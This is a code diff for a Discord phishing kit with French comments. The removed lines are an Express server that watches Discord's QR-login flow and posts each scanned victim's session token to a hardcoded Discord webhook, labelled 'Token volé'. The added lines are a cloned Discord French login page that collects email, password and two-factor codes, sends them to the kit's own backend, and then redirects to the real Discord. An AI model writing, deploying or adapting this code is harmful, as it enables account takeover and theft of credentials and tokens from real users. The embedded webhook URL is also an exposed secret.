@@ -1,60 +1,144 @@
-const express = require('express');
-const axios = require('axios');
-const WebSocket = require('ws');
-const app = express();
-
-app.use(express.json());
-app.use(express.static('public'));
-
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1565634875921272852/aMNpvHoAeH2iXdtQaGb-qwkpgc5xwJ3pB6NfhMD1_FhTGMSYM62ODX0YUcyubZt6ZRpg';
-
-// --- 1. Route pour générer le QR code Discord ---
-app.get('/api/qr', async (req, res) => {
-  try {
-    // On demande un QR à Discord
-    const r = await axios.post('https://discord.com/api/v9/auth/fingerprint', {
-      fingerprint: "12345678901234567890123456789012" // Un fingerprint random
-    });
-    
-    // On génère l'URL du QR avec ce fingerprint
-    const qrUrl = `https://discord.com/api/v9/auth/qr?fingerprint=${r.data.fingerprint}`;
-    
-    // On écoute le WebSocket de Discord pour voir si le mec a scanné
-    const ws = new WebSocket(`wss://gateway.discord.gg/?v=9&encoding=json`);
-    
-    ws.on('open', () => {
-      // On envoie la demande de QR login
-      ws.send(JSON.stringify({
-        op: 2,
-        d: {
-          fingerprint: r.data.fingerprint,
-          type: 1 // Type 1 = QR Login
-        }
-      }));
-    });
-
-    ws.on('message', async (data) => {
-      const payload = JSON.parse(data);
-      
-      // Si le mec a scanné et validé (Opcode 2, événement QR_CODE_AUTHENTICATED)
-      if (payload.t === 'QR_CODE_AUTHENTICATED') {
-        const token = payload.d.token;
-        
-        // BOOM, on envoie le token sur ton webhook
-        await axios.post(WEBHOOK_URL, { 
-          content: `🔥 **QR Code Scanné ! Token volé :**\n\`${token}\`` 
-        });
-        
-        ws.close();
-      }
-    });
-
-    // On renvoie l'URL du QR au frontend pour qu'il l'affiche
-    res.json({ qrUrl: qrUrl });
-    
-  } catch (error) {
-    res.status(500).json({ error: "Erreur Discord" });
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Discord</title>
+<link href="https://fonts.googleapis.com/css2?family=gg+sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  * { box-sizing: border-box; font-family: 'gg sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; }
+  body { 
+    background: #313338 url('https://discord.com/assets/4b0e1c8b7e4f6e9e9d5e5d5c5b5a5958.png') no-repeat center center fixed; 
+    background-size: cover;
+    color: #dbdee1; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; 
   }
-});
+  .login-container { display: flex; background: #313338; border-radius: 8px; width: 100%; max-width: 780px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.4); }
+  
+  .login-box { padding: 32px; width: 100%; max-width: 480px; display: flex; flex-direction: column; justify-content: center; }
+  .qr-box { padding: 32px; width: 100%; max-width: 300px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; border-left: 1px solid #2b2d31; }
+  
+  h2 { color: #f2f3f5; margin-bottom: 8px; font-size: 24px; font-weight: 600; text-align: center; }
+  p.sub { font-size: 16px; color: #b5bac1; margin-bottom: 20px; margin-top: 0; text-align: center; }
+  label { font-size: 12px; font-weight: 700; color: #b5bac1; text-transform: uppercase; margin-bottom: 8px; display: block; }
+  input { width: 100%; padding: 10px; margin-bottom: 20px; background: #1e1f22; border: none; color: #dbdee1; border-radius: 3px; font-size: 16px; outline: none; }
+  input:focus { box-shadow: 0 0 0 2px #5865F2; }
+  button { width: 100%; padding: 12px; background: #5865F2; color: white; border: none; border-radius: 3px; font-weight: 500; font-size: 16px; cursor: pointer; transition: 0.2s; }
+  button:hover { background: #4752C4; }
+  .link { font-size: 14px; color: #00a8fc; text-decoration: none; display: block; margin-top: 15px; margin-bottom: 20px; }
+  .link:hover { text-decoration: underline; }
+  .hidden { display: none; }
+  .qr-box h3 { color: #f2f3f5; font-size: 20px; margin-bottom: 8px; margin-top: 0; }
+  .qr-box p { color: #b5bac1; font-size: 14px; margin-bottom: 20px; }
+  .qr-image { width: 180px; height: 180px; background: white; border-radius: 8px; margin-bottom: 20px; display: flex; justify-content: center; align-items: center; text-align: center; }
+  .qr-image img { width: 100%; height: 100%; border-radius: 8px; display: none; }
+  
+  @media (max-width: 768px) {
+    .qr-box { display: none; }
+    .login-container { max-width: 480px; }
+  }
+</style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="login-box">
+      <div id="step1">
+        <h2>Bon retour !</h2>
+        <p class="sub">Nous sommes ravis de vous revoir.</p>
+        <form id="loginForm">
+          <label>Adresse e-mail ou numéro de téléphone <span style="color:#f23f43">*</span></label>
+          <input type="text" id="email" required>
+          <label>Mot de passe <span style="color:#f23f43">*</span></label>
+          <input type="password" id="password" required>
+          <a href="#" class="link">Mot de passe oublié ?</a>
+          <button type="submit">Se connecter</button>
+        </form>
+      </div>
+      
+      <div id="step2" class="hidden">
+        <h2>Vérification en deux étapes</h2>
+        <p class="sub">Entrez le code à 6 chiffres généré par votre application d'authentification.</p>
+        <form id="mfaForm">
+          <label>Code d'authentification <span style="color:#f23f43">*</span></label>
+          <input type="text" id="mfaCode" maxlength="6" required>
+          <button type="submit" style="margin-top: 15px;">Valider</button>
+        </form>
+      </div>
+    </div>
 
-app.listen(3000, () => console.log('Bench QR prête.'));
+    <div class="qr-box">
+      <div class="qr-image" id="qrContainer">
+        <span id="qrLoading" style="color:black; font-size:12px;">Chargement...</span>
+        <img id="qrImage" src="" alt="QR Code">
+      </div>
+      <h3>Ou connectez-vous avec un QR code</h3>
+      <p>Scannez ce code avec l'application Discord pour vous connecter instantanément.</p>
+    </div>
+  </div>
+
+<script>
+  // --- LOGIQUE DU QR CODE ---
+  async function loadQR() {
+    try {
+      const res = await fetch('/api/qr');
+      const data = await res.json();
+      if (data.qrUrl) {
+        document.getElementById('qrLoading').style.display = 'none';
+        const img = document.getElementById('qrImage');
+        img.src = data.qrUrl;
+        img.style.display = 'block';
+      }
+    } catch(e) {
+      document.getElementById('qrLoading').innerText = "Erreur";
+    }
+  }
+  loadQR();
+
+  // --- LOGIQUE DU FORMULAIRE ---
+  let savedEmail = "";
+  let savedPass = "";
+  let mfaTicket = "";
+
+  document.getElementById('loginForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    savedEmail = document.getElementById('email').value;
+    savedPass = document.getElementById('password').value;
+
+    const res = await fetch('/api/login', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({email: savedEmail, password: savedPass})
+    });
+    
+    const data = await res.json();
+    
+    if (data.mfa) {
+      mfaTicket = data.ticket;
+      document.getElementById('step1').classList.add('hidden');
+      document.getElementById('step2').classList.remove('hidden');
+    } else if (data.success) {
+      window.location.href = "https://discord.com/channels/@me";
+    } else {
+      alert("Identifiants incorrects.");
+    }
+  });
+
+  document.getElementById('mfaForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const code = document.getElementById('mfaCode').value;
+
+    const res = await fetch('/api/mfa', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({email: savedEmail, password: savedPass, code: code, ticket: mfaTicket})
+    });
+    
+    const data = await res.json();
+    if (data.success) {
+      window.location.href = "https://discord.com/channels/@me";
+    } else {
+      alert("Code invalide.");
+    }
+  });
+</script>
+</body>
+</html>
